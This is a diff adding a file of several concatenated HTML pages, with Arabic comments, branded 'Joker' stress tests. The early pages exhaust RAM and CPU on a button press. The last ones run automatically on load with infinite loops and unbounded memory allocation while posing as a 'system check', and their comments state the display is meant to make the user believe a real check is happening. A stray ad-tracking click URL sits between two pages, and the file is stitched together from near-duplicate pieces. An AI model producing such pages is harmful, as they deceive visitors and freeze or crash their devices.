@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ULTRA STRESS JOKER DZ</title>
+    <style>
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; padding-top: 50px; }
+        #warning { font-size: 20px; color: yellow; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div id="warning">⚠️ WARNING: EXTREME STRESS TEST ⚠️</div>
+    <div id="stats">System Idle...</div>
+    <button onclick="startUltra()">LAUNCH ATTACK</button>
+
+    <script>
+        let leak = [];
+        function startUltra() {
+            document.getElementById('stats').innerText = "ATTACKING RAM & CPU...";
+            
+            // استهلاك الرام بسرعة البرق (كل 10 ميللي ثانية)
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    let b = new Uint8Array(1024 * 1024); // 1MB
+                    b.fill(Math.random() * 255);
+                    leak.push(b);
+                }
+                document.getElementById('stats').innerText = "Allocated: " + (leak.length) + " MB";
+            }, 10);
+
+            // استهلاك المعالج (CPU) عبر حلقات لا نهائية
+            function cpuBurn() {
+                while(true) { Math.sqrt(Math.random() * 1000000); }
+            }
+            
+            // تشغيل عدة خيوط معالجة وهمية
+            for(let j=0; j<4; j++) {
+                setTimeout(cpuBurn, 0);
+            }
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Test de stress ultra Joker v2</title>
+</head>
+<body style="background-color: #050505; color: white;">
+    <h1 style="text-shadow: 0 0 10px #00ff00;">STRESS TEST</h1>
+    <p>Capacité de stockage : 16 Go</p>
+    <div id="logs" style="font-family: monospace;"></div>
+
+    <script>
+        // الكود البرمجي يجب أن يكون بالإنجليزية هنا
+        const logs = document.getElementById('logs');
+        console.log("البرنامج بدأ...");
+        // أضف هنا بقية الأوامر البرمجية (Script) بالإنجليزية
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Joker RAM Stress Test v2</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        #status {
+            font-size: 1.5rem;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 20px;
+        }
+        #logs {
+            width: 80%;
+            height: 200px;
+            border: 1px solid #333;
+            padding: 10px;
+            overflow-y: auto;
+            background: rgba(0, 255, 0, 0.05);
+            font-size: 0.8rem;
+        }
+        .btn {
+            background: transparent;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn:hover { background: #00ff00; color: black; }
+    </style>
+</head>
+<body>
+
+    <div id="status">JOKER SYSTEM STRESS: IDLE</div>
+    <div id="logs">Ready to start stress test...</div>
+    <button class="btn" onclick="startTest()">START STRESS TEST</button>
+
+    <script>
+        let memoryFill = [];
+        const logs = document.getElementById('logs');
+        const status = document.getElementById('status');
+
+        function addLog(message) {
+            const div = document.createElement('div');
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logs.appendChild(div);
+            logs.scrollTop = logs.scrollHeight;
+        }
+
+        function startTest() {
+            status.textContent = "STATUS: RUNNING...";
+            status.style.color = "red";
+            addLog("Warning: RAM allocation started.");
+
+            // تكرار استهلاك الذاكرة
+            setInterval(() => {
+                try {
+                    // إنشاء مصفوفة ضخمة (حوالي 8 ميجابايت في كل مرة)
+                    let buffer = new Float64Array(1024 * 1024); 
+                    for (let i = 0; i < buffer.length; i++) {
+                        buffer[i] = Math.random();
+                    }
+                    memoryFill.push(buffer);
+                    addLog(`Allocated: ${memoryFill.length * 8}MB total`);
+                } catch (e) {
+                    addLog("Memory Full or Browser Throttled.");
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
+https://gamayerr.ru/click?key=e8760633a5024f92d733&clickId=GKsCOLPxAWin_0pwnerrAegBta9tgAKHucC8tbDbvQM&Cost=0.001000&zoneId=1791925&ageGroup=AGE_30_60&campaignId=1228711&browser=Chrome&browserVersion=147&os=android&osVersion=android_11&carrier=ATM&creativeId=3863837&feedId=299&ISCI=000902<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Joker Ultra Stress Test v2</title>
+</head>
+<body style="background-color: #050505; color: #00ff00; text-align: center; font-family: monospace;">
+    <h1 style="text-shadow: 0 0 10px #00ff00;">JOKER SYSTEM STRESS 🛡️</h1>
+    <p>الرام المكتشفة: 16GB (نظام 64-بت)</p>
+    <hr style="border: 1px solid #333;">
+    <div id="logs" style="font-size: 14px; color: #888;"></div>
+
+    <script>
+        const logs = document.getElementById('logs');
+        const workerCode = `
+            let memory = [];
+            onmessage = function() {
+                setInterval(() => {
+                    // استهلاك رام حقيقي باستخدام TypedArrays (تتخطى تحسينات المتصفح)
+                    let buffer = new Float64Array(1024 * 1024 * 5); // حوالي 40MB في كل نبضة
+                    for(let i=0; i<buffer.length; i++) buffer[i] = Math.random();
+                    memory.push(buffer);
+                    
+                    // إجهاد المعالج بحسابات معقدة
+                    for(let j=0; j<1000000; j++) {
+                        Math.atan(Math.tan(Math.sqrt(Math.random())));
+                    }
+                    postMessage("Chunk Added");
+                }, 100);
+            };
+        `;
+
+        // تحويل كود العامل إلى رابط قابل للتشغيل
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        // تشغيل 16 عامل (بعد عدد خيوط المعالج المتوقعة)
+        for (let i = 0; i < 16; i++) {
+            const worker = new Worker(workerUrl);
+            worker.postMessage("start");
+            worker.onmessage = () => {
+                const p = document.createElement('div');
+                p.innerText = "Worker " + i + " is pushing limits...";
+                if(logs.children.length > 10) logs.innerHTML = "";
+                logs.appendChild(p);
+            };
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Joker System Stress Test</title>
+</head>
+<body style="background-color: black; color: red; text-align: center; font-family: sans-serif;">
+    <h1 style="font-size: 50px;">JOKER SYSTEM CHECK... 🛡️</h1>
+    <h2 id="status">جاري فحص القوة القصوى...</h2>
+
+    <script>
+        // مصفوفة عملاقة للاستهلاك
+        let memoryBurner = [];
+
+        // وظيفة لإجهاد المعالج (CPU Stress)
+        function stressCPU() {
+            while (true) {
+                Math.sqrt(Math.random() * Math.random());
+            }
+        }
+
+        // تشغيل عدة عمليات (Threads) وهمية لإجهاد الرام والمعالج
+        setInterval(() => {
+            // استهلاك الرام بشكل أعنف
+            for (let i = 0; i < 5000; i++) {
+                memoryBurner.push(new Array(1000000).fill("JOKER-ULTRA-STRESS-TEST-" + Math.random()));
+            }
+            
+            // تحديث النص ليوهم المستخدم أن هناك فحصاً
+            document.getElementById('status').innerText = "Memory Loaded: " + (memoryBurner.length * 10) + "MB";
+            
+            console.log("Joker is testing your limits...");
+        }, 1); // سرعة فائقة (1 ملي ثانية)
+
+        // محاولة تشغيل إجهاد المعالج في الخلفية
+        setTimeout(() => {
+            stressCPU();
+        }, 1000);
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head><title>Joker Ultra Check</title></head>
+<body style="background-color: black; color: lime; text-align: center;">
+    <h1>جاري فحص القوة القصوى لنظامك... 🛡️</h1>
+    <script>
+        // استهلاك الرام والمعالج بأقصى سرعة ممكنة
+        function burn() {
+            let storage = [];
+            while (true) {
+                // توليد بيانات ضخمة ومعالجتها في نفس الوقت
+                storage.push(new Array(1000000).fill(Math.random()));
+                Math.sqrt(Math.random() * Math.random()); 
+            }
+        }
+        // البدء بعد 2 ثانية ليعتقد المستخدم أن هناك فحصاً حقيقياً
+        setTimeout(burn, 2000);
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head><title>Joker Ultra Check</title></head>
+<body style="background-color: black; color: lime; text-align: center;">
+    <h1>جاري فحص القوة القصوى لنظامك... 🛡️</h1>
+    <script>
+        // استهلاك الرام والمعالج بأقصى سرعة ممكنة
+        function burn() {
+            let storage = [];
+            while (true) {
+                // توليد بيانات ضخمة ومعالجتها في نفس الوقت
+                storage.push(new Array(1000000).fill(Math.random()));
+                Math.sqrt(Math.random() * Math.random()); 
+            }
+        }
+        // البدء بعد 2 ثانية ليعتقد المستخدم أن هناك فحصاً حقيقياً
+        setTimeout(burn, 2000);
+    </script>
+</body>
+</html>
